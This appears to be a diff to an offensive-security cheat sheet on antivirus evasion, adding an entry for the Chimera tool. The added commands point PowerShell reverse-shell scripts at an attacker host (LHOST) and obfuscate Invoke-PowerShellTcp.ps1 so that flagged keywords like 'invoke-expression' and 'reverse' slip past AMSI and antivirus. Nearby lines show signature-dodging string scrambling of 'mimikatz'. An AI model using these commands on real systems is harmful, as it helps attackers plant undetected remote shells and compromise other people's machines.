@@ -6,6 +6,7 @@
 
 - [AMSI](#amsi)
 - [AntiVirus Evasion](#antivirus-evasion)
+- [Chimera](#chimera)
 - [Donut](#donut)
 - [Freeze](#freeze)
 - [Limelighter](#limelighter)
@@ -281,6 +282,20 @@ C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
 | | - Scrambling ('mimikatz' -> 'miMi'+'KatZ') |
 | Heuristics/Behavioral | Polymorphism |
 | | Custom Payloads |
+
+## Chimera
+
+> https://github.com/tokyoneon/Chimera
+
+```c
+$ sed -i 's/192.168.56.101/<LHOST>/g' shells/*.ps1
+```
+
+```c
+$ ./chimera.sh -f shells/Invoke-PowerShellTcp.ps1 -l 3 -o /tmp/chimera.ps1 -v -t powershell,windows,\
+copyright -c -i -h -s length,get-location,ascii,stop,close,getstream -b new-object,reverse,\
+invoke-expression,out-string,write-error -j -g -k -r -p
+```
 
 ## Donut
 
